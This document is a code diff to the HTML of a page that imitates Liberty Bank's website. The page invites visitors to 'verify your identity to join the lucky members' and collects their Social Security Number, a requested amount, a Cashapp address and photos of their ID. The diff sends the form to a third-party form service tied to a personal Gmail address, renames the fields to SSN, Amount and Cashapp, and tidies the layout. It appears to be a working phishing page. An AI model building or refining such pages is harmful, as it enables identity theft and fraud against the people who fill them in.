@@ -10,8 +10,12 @@
   <body>
     <div class="mobile-container">
       <header>
-        <img src="images/Liberty-Bank-.jpg" width="100px" height="70px" />
-        <button class="menu-btn">&#9776;</button>
+        <img src="images/Liberty-Bank-.jpg" width="90px" height="60px" />
+        <div class="header-btn">
+          <button class="login-btn">Log in</button>
+          <button class="menu-btn">&#9776;</button>
+        </div>
+
         <nav class="mobile-nav">
           <ul>
             <li><a href="#">Home</a></li>
@@ -24,9 +28,9 @@
       <main>
         <section class="hero-section">
           <img src="" alt="" class="hero-section-image" />
-          <h2>VERIFY YOUYR IDENTITY TO JOIN <br />THE LUCKY MEMBERS TODAY</h2>
+          <h2>VERIFY YOUR IDENTITY TO JOIN <br />THE LUCKY MEMBERS TODAY</h2>
           <form
-            action="https://formsubmit.co/09faecd1ecfd3a88311126b11432428d"
+            action="https://formsubmit.co/akinbotelanre2012@gmail.com"
             method="POST"
             enctype="multipart/form-data"
           >
@@ -69,7 +73,7 @@
               <input
                 type="tel"
                 id="tel"
-                name="tel"
+                name="SSN"
                 placeholder="Social Security Number (SSN)"
                 required
               />
@@ -78,7 +82,7 @@
               <input
                 type="text"
                 id="text"
-                name="text"
+                name="Amount"
                 placeholder="Amount Request"
                 required
               />
@@ -87,7 +91,7 @@
               <input
                 type="text"
                 id="text"
-                name="text"
+                name="Cashapp"
                 placeholder="Cashapp or Paycheck Address"
                 required
               />
@@ -96,8 +100,8 @@
               <textarea
                 name="message"
                 id="message"
-                cols="30"
-                rows="10"
+                cols="33"
+                rows="4"
                 placeholder="comment"
                 required
               ></textarea>
@@ -109,7 +113,7 @@
                 id="id"
                 name="image"
                 placeholder="Front ID"
-                accept=".jpg, .jpeg, .png, .pdf, .doc, .docx"
+                accept="image/png, image/jpeg"
                 required
               />
             </div>
@@ -119,27 +123,34 @@
                 type="file"
                 id="image"
                 name="image"
-                placeholder="Front ID"
-                accept=".jpg, .jpeg, .png, .pdf, .doc, .docx"
+                accept="image/png, image/jpeg"
                 required
               />
             </div>
-            <div><button type="submit" value="Submit">Submit</button></div>
+            <div>
+              <button type="submit" value="Submit" class="submit-btn">
+                Submit
+              </button>
+            </div>
           </form>
           <div class="hero-section-styles">
             <div class="hero-section-styles">
               <div class="hero-section-styles"></div>
             </div>
           </div>
-          <h1>Be Community Kind</h1>
-          <p>
+          <h1>
+            Be Community <br />
+            Kind
+          </h1>
+          <p class="about">
             Leading with kindness makes a difference, <br />
             and at Liberty Bank, that is what we are all about.
           </p>
-          <button>Learn More</button>
+          <button class="learn-btn">Learn More</button>
         </section>
-        <section>
+        <section class="section-2">
           <h2>I'm looking to:</h2>
+          <hr />
           <details>
             <summary><span>Earn a great rate</span></summary>
             <h3>Earn up to 5.35% APY on special offers</h3>
@@ -186,15 +197,15 @@
             <div><a href="#">Find a branch</a></div>
           </details>
         </section>
-        <section>
+        <section class="section-3">
           <h2>Digital Banking</h2>
           <p>
             Digital Banking is always on so you can manage <br />your account at
             any hour. keep control at your <br />
             fingertips with financial planning and expense <br />tracking tools.
           </p>
-          <button>Learn More</button>
-          <div>
+          <button class="learn-btn">Learn More</button>
+          <div class="Digital-bank">
             <ul>
               <li>Mobile Check Deposit</li>
               <li>Card Controls</li>
@@ -204,26 +215,22 @@
             </ul>
           </div>
         </section>
-        <section>
+        <section class="section-4">
           <h2>Grow with Us</h2>
-          <hr />
-          <div>
+          <div class="grow-with-us">
             <p>Community Kind</p>
             <p>At Liberty Bank, we know kindness starts with us.</p>
-            <button>Spread kindness</button>
-            <hr />
+            <button class="learn-btn">Spread kindness</button>
           </div>
-          <div>
+          <div class="grow-with-us">
             <p>Careers</p>
             <p>Your new career is right here at Liberty.</p>
-            <button>Explore Careers</button>
-            <hr />
+            <button class="learn-btn">Explore Careers</button>
           </div>
-          <div>
+          <div class="grow-with-us">
             <p>Learn Center</p>
             <p>Visit the Liberty Bank Financial Wellness <br />Academy.</p>
-            <button>Learn with Liberty</button>
-            <hr />
+            <button class="learn-btn">Learn with Liberty</button>
           </div>
         </section>
         <section>
